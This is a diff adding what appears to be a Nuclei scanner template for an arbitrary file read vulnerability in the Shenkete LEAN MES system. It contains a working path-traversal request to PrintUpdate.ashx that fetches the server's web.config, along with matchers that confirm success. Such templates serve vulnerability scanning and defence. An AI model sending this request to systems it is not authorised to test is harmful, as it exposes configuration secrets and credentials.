@@ -1,0 +1,29 @@
+id: shenkete-PrintUpdate-file
+
+info:
+  name: 深科特 LEAN MES系统 PrintUpdate.ashx 任意文件读取漏洞
+  author: shenkete
+  severity: medium
+  tags: shenkete
+
+http:
+  - raw:
+      - |
+        POST /Handler/PrintUpdate.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/x-www-form-urlencoded
+
+        action=DownLoadFile&file=../../web.config
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<configuration>'
+          - '<appSettings>'
+        condition: and
+      - type: status
+        status:
+          - 200
